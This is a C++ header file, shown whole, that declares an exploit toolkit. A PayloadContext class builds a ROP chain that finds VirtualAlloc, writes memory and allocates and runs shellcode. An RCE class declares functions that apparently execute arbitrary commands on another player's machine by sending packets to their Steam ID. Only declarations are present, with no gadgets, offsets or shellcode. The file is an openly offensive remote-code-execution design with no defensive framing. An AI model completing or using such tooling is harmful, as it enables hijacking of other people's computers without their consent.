#pragma once

class PayloadContext
{
public:
	PayloadContext();
	void Rop_AllocateAndExecuteShellcode(const void* shellcode, size_t size, const std::vector<std::string>& storage);
	std::vector<std::uint8_t> Serialize();
private:
	std::uintptr_t Rop_CallFunction(std::uintptr_t address, const std::vector<std::uintptr_t>& params, bool storeReturn = false, unsigned int dereferenceCount = 0);
	void Rop_WriteToAddress(std::uintptr_t address, const void* buffer, size_t& size, unsigned int dereferenceCount = 0);
	std::uintptr_t Rop_AppendToStorage(const void* buffer, size_t size);
	std::uintptr_t Rop_FindVirtualAlloc();
	void Push(std::uintptr_t value);

	std::vector<std::uintptr_t> payload;
	std::uintptr_t storageWritePtr;
};

class RCE
{
public:
	static void ExecuteCmdOnSteamID(const CSteamID& steamID, const std::string& cmd, int showCmd);
private:
	static void SendToSteamID(const CSteamID& steamID, const std::vector<std::uint8_t>& packet, int port);
};